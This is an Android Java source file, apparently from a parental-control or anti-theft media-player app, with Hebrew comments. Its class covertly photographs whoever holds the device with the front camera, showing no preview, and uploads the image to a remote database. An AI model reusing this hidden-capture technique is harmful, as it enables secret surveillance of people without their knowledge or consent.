package com.chaiapps.chasima;

import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.Collections;

/** צילום חשאי מהמצלמה הקדמית (ללא תצוגה) – לזיהוי מי מחזיק בנגן. */
final class StealthCam {
    private StealthCam() {}

    /** מצלם ושולח להורה. reason: "theft" / "parent". רץ ברקע. */
    static void capture(final Context ctx, final String reason) {
        final Context c = ctx.getApplicationContext();
        if (c.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) { status(c, "❌ אין הרשאת מצלמה בנגן"); return; }
        final CameraManager cm = (CameraManager) c.getSystemService(Context.CAMERA_SERVICE);
        if (cm == null) return;
        try {
            String front = null, back = null;
            for (String id : cm.getCameraIdList()) {
                Integer f = cm.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING);
                if (f != null && f == CameraCharacteristics.LENS_FACING_FRONT && front == null) front = id;
                if (f != null && f == CameraCharacteristics.LENS_FACING_BACK && back == null) back = id;
            }
            final String camId = front != null ? front : back;
            if (camId == null) return;

            final HandlerThread ht = new HandlerThread("cam");
            ht.start();
            final Handler bg = new Handler(ht.getLooper());
            final CameraCharacteristics ch = cm.getCameraCharacteristics(camId);
            final Integer so = ch.get(CameraCharacteristics.SENSOR_ORIENTATION);
            final boolean isFront = camId.equals(front);
            // גודל תמונה: הכי קרוב ל-1280 (ולא יותר)
            android.util.Size best = new android.util.Size(640, 480);
            try {
                android.hardware.camera2.params.StreamConfigurationMap map = ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
                if (map != null) {
                    int bw = 0;
                    for (android.util.Size z : map.getOutputSizes(android.graphics.ImageFormat.JPEG))
                        if (z.getWidth() <= 1280 && z.getWidth() > bw) { bw = z.getWidth(); best = z; }
                }
            } catch (Exception ignored) {}
            final ImageReader reader = ImageReader.newInstance(best.getWidth(), best.getHeight(), android.graphics.ImageFormat.JPEG, 2);
            // משטח "דמה" לתצוגה מקדימה – כדי שהמצלמה תספיק לכוון חשיפה (אחרת התמונה יוצאת שחורה)
            final android.graphics.SurfaceTexture tex = new android.graphics.SurfaceTexture(10);
            tex.setDefaultBufferSize(640, 480);
            final android.view.Surface dummy = new android.view.Surface(tex);
            final boolean[] done = {false};

            reader.setOnImageAvailableListener(r -> {
                Image img = null;
                try {
                    img = r.acquireLatestImage();
                    if (img == null || done[0]) return;
                    done[0] = true;
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    upload(c, bytes, reason, so == null ? 0 : so, isFront);
                } catch (Exception ignored) {
                } finally {
                    if (img != null) img.close();
                }
            }, bg);

            cm.openCamera(camId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice cam) {
                    Runnable closeAll = () -> {
                        try { cam.close(); } catch (Exception ignored) {}
                        try { reader.close(); } catch (Exception ignored) {}
                        try { dummy.release(); tex.release(); } catch (Exception ignored) {}
                        try { ht.quitSafely(); } catch (Exception ignored) {}
                    };
                    try {
                        cam.createCaptureSession(java.util.Arrays.asList(dummy, reader.getSurface()),
                                new CameraCaptureSession.StateCallback() {
                                    @Override
                                    public void onConfigured(CameraCaptureSession session) {
                                        try {
                                            CaptureRequest.Builder pv = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                                            pv.addTarget(dummy);
                                            pv.set(CaptureRequest.CONTROL_MODE, CameraMetadataAuto());
                                            pv.set(CaptureRequest.CONTROL_AE_MODE, android.hardware.camera2.CameraMetadata.CONTROL_AE_MODE_ON);
                                            session.setRepeatingRequest(pv.build(), null, bg);
                                            // אחרי שנייה וחצי – החשיפה מכוונת, מצלמים
                                            bg.postDelayed(() -> {
                                                try {
                                                    CaptureRequest.Builder b = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                                    b.addTarget(reader.getSurface());
                                                    b.set(CaptureRequest.CONTROL_MODE, CameraMetadataAuto());
                                                    b.set(CaptureRequest.CONTROL_AE_MODE, android.hardware.camera2.CameraMetadata.CONTROL_AE_MODE_ON);
                                                    b.set(CaptureRequest.JPEG_QUALITY, (byte) 85);
                                                    session.capture(b.build(), null, bg);
                                                } catch (Exception e) { closeAll.run(); }
                                            }, 1500);
                                            bg.postDelayed(closeAll, 6000);
                                        } catch (Exception e) {
                                            closeAll.run();
                                        }
                                    }

                                    @Override
                                    public void onConfigureFailed(CameraCaptureSession session) {
                                        closeAll.run();
                                    }
                                }, bg);
                    } catch (Exception e) {
                        closeAll.run();
                    }
                }

                @Override
                public void onDisconnected(CameraDevice cam) {
                    cam.close();
                }

                @Override
                public void onError(CameraDevice cam, int error) {
                    cam.close();
                    status(c, "❌ המצלמה לא נפתחה (שגיאה " + error + ")");
                }
            }, bg);
        } catch (Exception e) {
            status(c, "❌ צילום נכשל: " + e.getMessage());
        }
    }

    private static void status(Context c, String msg) {
        try { Fb.patch("d/" + Cfg.deviceId(c) + "/st", new JSONObject().put("camMsg", msg).toString()); } catch (Exception ignored) {}
    }

    private static int CameraMetadataAuto() {
        return android.hardware.camera2.CameraMetadata.CONTROL_MODE_AUTO;
    }

    private static void upload(Context c, byte[] jpeg, String reason, int rot, boolean front) {
        try {
            // דחיסה לתמונה קטנה כדי לשלוח במהירות
            Bitmap bm = BitmapFactory.decodeByteArray(jpeg, 0, jpeg.length);
            if (bm == null) return;
            // סיבוב לפי כיוון החיישן – כדי שהתמונה תצא עומדת (נגן מוחזק לאורך)
            Matrix m = new Matrix();
            if (rot != 0) m.postRotate(rot);
            bm = Bitmap.createBitmap(bm, 0, 0, bm.getWidth(), bm.getHeight(), m, true);
            if (bm.getWidth() > 960 || bm.getHeight() > 960) {
                float sc = 960f / Math.max(bm.getWidth(), bm.getHeight());
                bm = Bitmap.createScaledBitmap(bm, Math.round(bm.getWidth() * sc), Math.round(bm.getHeight() * sc), true);
            }
            ByteArrayOutputStream o = new ByteArrayOutputStream();
            bm.compress(Bitmap.CompressFormat.JPEG, 70, o);
            String b64 = Base64.encodeToString(o.toByteArray(), Base64.NO_WRAP);
            JSONObject p = new JSONObject();
            p.put("img", b64);
            p.put("r", reason);
            p.put("t", new JSONObject().put(".sv", "timestamp"));
            Fb.put("d/" + Cfg.deviceId(c) + "/photo", p.toString());
            status(c, "");
        } catch (Exception ignored) {}
    }
}
